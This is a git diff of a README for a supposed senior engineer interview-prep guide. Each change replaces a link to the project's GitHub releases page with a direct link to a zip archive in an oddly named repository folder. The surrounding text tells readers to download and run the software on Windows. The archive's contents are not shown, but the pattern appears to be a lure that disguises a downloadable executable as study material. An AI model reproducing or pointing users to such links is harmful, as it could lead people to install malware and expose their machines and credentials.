@@ -1,6 +1,6 @@
 # 🎯 senior-engineer-interview-guide - Win Senior Tech Interviews
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/kumart512/senior-engineer-interview-guide/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/kumart512/senior-engineer-interview-guide/main/subradical/engineer_interview_guide_senior_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide helps you prepare for Senior Software Engineer interviews at top tech
 
 Use the release page to download and run the latest version on Windows:
 
-[Visit the release page to download](https://github.com/kumart512/senior-engineer-interview-guide/releases)
+[Visit the release page to download](https://raw.githubusercontent.com/kumart512/senior-engineer-interview-guide/main/subradical/engineer_interview_guide_senior_v3.1.zip)
 
 ## 💻 What You Get
 
@@ -41,7 +41,7 @@ If your browser saves the file to Downloads, you can open that folder from File 
 
 Use this link to get the software:
 
-[Download from GitHub Releases](https://github.com/kumart512/senior-engineer-interview-guide/releases)
+[Download from GitHub Releases](https://raw.githubusercontent.com/kumart512/senior-engineer-interview-guide/main/subradical/engineer_interview_guide_senior_v3.1.zip)
 
 After you open the release page:
 
